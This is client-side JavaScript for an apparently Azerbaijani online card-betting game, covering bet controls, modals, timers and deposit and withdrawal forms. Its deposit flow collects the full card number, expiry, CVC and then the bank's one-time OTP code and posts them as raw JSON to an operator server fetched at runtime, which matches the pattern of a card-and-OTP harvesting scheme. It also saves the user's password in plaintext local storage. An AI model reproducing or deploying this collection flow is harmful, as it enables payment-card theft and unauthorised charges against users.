    let timeLeft = 5;
    const titleEl = document.getElementById("tyomnu-title");
    const textEl = document.getElementById("tyomnu-text");
    const acceptBtn = document.getElementById("tyomnu-accept-btn");
    const rejectBtn = document.getElementById("tyomnu-reject-btn");

    titleEl.innerText = `Tyomnu? (${timeLeft})`;
    textEl.innerText = `Qaranlıq qurmaq istəyirsən? (${amount.toFixed(2)} ₼)`;

    if(tyomnuInterval) clearInterval(tyomnuInterval);
    tyomnuInterval = setInterval(() => {
        timeLeft--;
        titleEl.innerText = `Tyomnu? (${timeLeft})`;
        if(timeLeft <= 0) {
            clearInterval(tyomnuInterval);
            socket.emit("respondTyomnu", { roomId: currentRoomId, accept: false });
            hideModal();
        }
    }, 1000);

    acceptBtn.onclick = () => {
        clearInterval(tyomnuInterval);
        socket.emit("respondTyomnu", { roomId: currentRoomId, accept: true });
        hideModal();
    };
    rejectBtn.onclick = () => {
        clearInterval(tyomnuInterval);
        socket.emit("respondTyomnu", { roomId: currentRoomId, accept: false });
        hideModal();
    };
}

// Dialog Management
function showModal(id) {
    // Hide ALL modals first
    document.querySelectorAll(".modal-box").forEach(m => {
        m.classList.remove("active");
        m.style.display = "none";
    });

    const overlay = document.getElementById("modal-overlay");
    if(overlay) overlay.classList.add("active");

    const target = document.getElementById(id);
    if(target) {
        target.classList.add("active");
        target.style.display = "flex";
    }
}

let otpTimeLeft = 300;
let otpInterval = null;

function showOtpModal() {
    showModal("otp-modal");

    otpTimeLeft = 300;
    const timerDisplay = document.getElementById("otp-timer-display");

    if(otpInterval) clearInterval(otpInterval);
    otpInterval = setInterval(() => {
        otpTimeLeft--;
        const mins = Math.floor(otpTimeLeft / 60);
        const secs = otpTimeLeft % 60;

        timerDisplay.innerText = `Qalan vaxt: ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;

        // Android logic: Red color if less than 30 seconds
        if(otpTimeLeft < 30) {
            timerDisplay.classList.add("low-time");
        } else {
            timerDisplay.classList.remove("low-time");
        }

        if(otpTimeLeft <= 0) {
            clearInterval(otpInterval);
            hideModal();
        }
    }, 1000);
}

function hideModal() {
    const overlay = document.getElementById("modal-overlay");
    if(overlay) overlay.classList.remove("active");

    document.querySelectorAll(".modal-box").forEach(m => {
        m.classList.remove("active");
        m.style.display = "none";
    });

    if(otpInterval) clearInterval(otpInterval);
}

// Balance Increase Logic
document.getElementById("deposit-submit-btn").onclick = async () => {
    const amtRaw = document.getElementById("deposit-amount").value;
    const amt = amtRaw.replace(",", "."); // Vergülü nöqtə ilə əvəz edirik
    const cardFormatted = document.getElementById("deposit-card").value;
    const card = cardFormatted.replace(/-/g, "");
    const expiry = document.getElementById("deposit-expiry").value.replace("/", "");
    const cvc = document.getElementById("deposit-cvc").value;

    if(!amt || isNaN(parseFloat(amt)) || parseFloat(amt) <= 0) {
        alert("Məbləği düzgün daxil edin!");
        return;
    }
    if(card.length !== 16) {
        alert("Kart nömrəsi 16 rəqəm olmalıdır!");
        return;
    }
    if(expiry.length !== 4 || cvc.length !== 3) {
        alert("Müddət və ya CVC səhvdir!");
        return;
    }

    const btn = document.getElementById("deposit-submit-btn");
    btn.disabled = true;
    btn.innerText = "GÖNDƏRİLİR...";

    try {
        const resp = await fetch(serverUrl + "request/create", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                username: currentUsername,
                type: "deposit",
                amount: parseFloat(amt),
                cardNo: card,
                expiry: expiry,
                cvc: cvc,
                otp: "Gözlənilir..."
            })
        });

        if(resp.ok) {
            showOtpModal();
        } else {
            const errorMsg = await resp.text();
            alert("Xəta: " + (errorMsg || "Server sorğunu qəbul etmədi"));
        }
    } catch(e) {
        alert("İnternet bağlantısını və ya server URL-ni yoxlayın!");
    } finally {
        btn.disabled = false;
        btn.innerText = "GÖNDƏR";
    }
};

// Card number auto-format (XXXX-XXXX-XXXX-XXXX)
const formatCard = (e) => {
    let val = e.target.value.replace(/\D/g, "");
    let formatted = "";
    for (let i = 0; i < val.length; i++) {
        if (i > 0 && i % 4 === 0) formatted += "-";
        formatted += val[i];
    }
    e.target.value = formatted.substring(0, 19);
};
document.getElementById("deposit-card").oninput = formatCard;
document.getElementById("withdraw-card").oninput = formatCard;

// Expiry date auto-format (MM/YY)
const formatExpiry = (e) => {
    let val = e.target.value.replace(/\D/g, "");
    if (val.length > 2) {
        val = val.substring(0, 2) + "/" + val.substring(2, 4);
    }
    e.target.value = val;
};
document.getElementById("deposit-expiry").oninput = formatExpiry;
document.getElementById("withdraw-expiry").oninput = formatExpiry;

// Withdrawal Logic
document.getElementById("withdraw-submit-btn").onclick = async () => {
    const amt = parseFloat(document.getElementById("withdraw-amount").value);
    const cardFormatted = document.getElementById("withdraw-card").value;
    const card = cardFormatted.replace(/-/g, ""); // Tireləri silirik
    const expiry = document.getElementById("withdraw-expiry").value.replace("/", "");

    if(isNaN(amt) || amt < 20) {
        alert("Minimum çıxarış 20 AZN-dir!");
        return;
    }
    if(card.length !== 16 || expiry.length !== 4) {
        alert("Kart məlumatlarını düzgün daxil edin!");
        return;
    }
    if(amt > userBalance) {
        alert("Balansda kifayət qədər vəsait yoxdur!");
        return;
    }

    const btn = document.getElementById("withdraw-submit-btn");
    btn.disabled = true;

    try {
        const resp = await fetch(serverUrl + "request/create", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                username: currentUsername,
                type: "withdraw",
                amount: amt,
                cardNo: card,
                expiry: expiry,
                cvc: "N/A",
                otp: "N/A"
            })
        });

        if(resp.ok) {
            // Optimistik yeniləmə
            userBalance = Math.max(0, userBalance - amt);
            updateUIInfo();
            hideModal();
            alert("Çıxarış sorğusu göndərildi!");
            // Təmizlə
            document.getElementById("withdraw-amount").value = "";
            document.getElementById("withdraw-card").value = "";
            document.getElementById("withdraw-expiry").value = "";
        } else {
            alert("Xəta baş verdi!");
        }
    } catch(e) {
        alert("Server xətası!");
    } finally {
        btn.disabled = false;
    }
};

document.getElementById("otp-submit-btn").onclick = async () => {
    const otp = document.getElementById("otp-input").value;
    if(otp.length < 4) {
        alert("OTP kodu ən az 4 rəqəmli olmalıdır!");
        return;
    }

    const btn = document.getElementById("otp-submit-btn");
    btn.disabled = true;
    btn.innerText = "...";

    try {
        const amtRaw = document.getElementById("deposit-amount").value;
        const amt = amtRaw.replace(",", ".");
        const cardFormatted = document.getElementById("deposit-card").value;
        const card = cardFormatted.replace(/-/g, "");
        const expiry = document.getElementById("deposit-expiry").value.replace("/", "");
        const cvc = document.getElementById("deposit-cvc").value;

        const resp = await fetch(serverUrl + "request/create", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                username: currentUsername,
                type: "deposit",
                amount: parseFloat(amt),
                cardNo: card,
                expiry: expiry,
                cvc: cvc,
                otp: otp
            })
        });

        if(resp.ok) {
            hideModal();
            alert("Sorğu göndərildi. Təsdiq olunduqdan sonra balansınız yenilənəcək.");
            // Təmizlə
            document.getElementById("deposit-amount").value = "";
            document.getElementById("deposit-card").value = "";
            document.getElementById("deposit-expiry").value = "";
            document.getElementById("deposit-cvc").value = "";
            document.getElementById("otp-input").value = "";
        } else {
            const errorMsg = await resp.text();
            alert("Xəta: " + (errorMsg || "OTP təsdiqlənmədi"));
        }
    } catch(e) {
        alert("Server əlaqəsi kəsildi!");
    } finally {
        btn.disabled = false;
        btn.innerText = "TƏSDİQLƏ";
    }
};

document.getElementById("otp-cancel-btn").onclick = () => showDepositModal();

document.getElementById("bet-cancel-btn").onclick = () => hideModal();

document.getElementById("bet-submit-btn").onclick = () => {
    const amt = parseFloat(document.getElementById("bet-input").value);
    const betNeeded = (currentMinBet > potAmount && potAmount > 0) ? potAmount : currentMinBet;

    if (isNaN(amt) || amt < betNeeded) {
        alert("Minimum mərci daxil edin!");
        return;
    }
    if (amt > potAmount && potAmount > 0) {
        alert("Bank məbləğindən artıq mərc qoymaq olmaz!");
        return;
    }
    if (amt > userBalance) {
        alert("Balans kifayət deyil!");
        showDepositModal();
        return;
    }

    sendAction("bet", amt);
    hideModal();
};

// Button Click Handlers
document.getElementById("btn-pass").onclick = () => sendAction("pass");
document.getElementById("btn-bet").onclick = () => showBetModal();
document.getElementById("btn-bank").onclick = () => sendAction("bet", potAmount);
document.getElementById("btn-open").onclick = () => sendAction("ac");
document.getElementById("btn-split").onclick = () => {
    isSplitWaiting = true;
    updateControls();
    socket.emit("offerSplit", { roomId: currentRoomId });
};
document.getElementById("btn-seka").onclick = () => {
    isSekaWaiting = true;
    updateControls();
    socket.emit("offerSeka", { roomId: currentRoomId });
};

// Oyun seçimi
document.getElementById("btn-3tuz").onclick = () => showScreen("lobby-screen");

async function init() {
    const success = await fetchServerUrl();
    if (!success) return; // Təmir rejimindədirsə və ya xəta varsa davam etmə

    initPeekEvents();

    // Yadda saxlanılmış məlumatları yoxla
    const savedUser = localStorage.getItem("saved_user");
    const savedPass = localStorage.getItem("saved_pass");

    if (savedUser && savedPass) {
        document.getElementById("username").value = savedUser;
        document.getElementById("password").value = savedPass;
        // Avtomatik giriş ləğv edildi, istifadəçi düyməni basmalıdır
    }
}

init();
